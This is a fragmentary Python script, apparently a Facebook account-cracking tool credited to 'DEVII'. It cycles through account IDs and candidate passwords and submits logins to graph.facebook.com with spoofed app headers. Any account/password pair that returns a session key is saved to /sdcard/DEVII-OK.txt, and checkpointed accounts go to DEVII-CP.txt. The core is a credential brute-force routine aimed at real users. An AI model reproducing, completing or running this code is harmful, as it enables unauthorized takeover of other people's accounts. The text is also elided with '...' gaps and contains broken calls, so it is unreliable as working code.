...
\33[1;91m$$ |  $$ |$$   ____| \$$$  /  $$ |
\33[1;91m$$$$$$$  |\$$$$$$$\   \$  /   $$ |
\33[1;91m\_______/  \_______|   \_/    \__|
                                  
                                             
===============================================   
\33[1;97m[+] Creater  : DEVII
\33[1;97m[+] Version  : 1.3.0
\33[1;97m[+] GitHub   : https://github.com/devixayyat 
===============================================   
'''
...
def Hxw_Main():
    ...
    if inpp == "4":
     ...
     os.system('https://www.facebook.com/profile.php?id=devikinge')
     os.system('https://www.facebook.com/profile.php?id=devikinge')
     exit()
    if inpp == "0":
     exit('Exit!')
     ...
     try:
      ...
      #      print(response.text) 
            if 'session_key' in response.text:
                ...
                cpacc.append(acc)
                open('/sdcard/DEVII-CP.txt','a').write(f'{acc} • {pword}\n')
                break
            else:
                continue
        loop += 1
    ...
    def start2(user):
      ...
      try:
        ...
        try:
            ...
            last = first
        pers = str(int(loop)/int(len(accounts)) * 100)[:4]
        sys.stdout.write('\rDEVII\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}      \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
        sys.stdout.flush()
        for pword in totalpass:
            heads = None
            header = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": heads,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
            ...
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[1;92m[\033[1;97mDEVII-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
                open('/sdcard/DEVII-OK.txt','a').write(f'{acc} • {pword}\n')
                if 'y' in apps:
                	check(r,coki)
                if c=='y':
                 try:  
                ...
                if cpok=='n':
                     ...
                     print('\r\033[1;91m[\033[1;97mDEVII-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword)
                cpacc.append(acc)
                open('/sdcard/DEVII-CP.txt','a').write(f'{acc} • {pword}\n')
                break
            else:
...
def andom():
    ...
    print(f"{oo('•')}/sdcard/DEVII-OK.txt")
    print('\033[1;93m='*25)
    print()    
    def start(user):
     try:
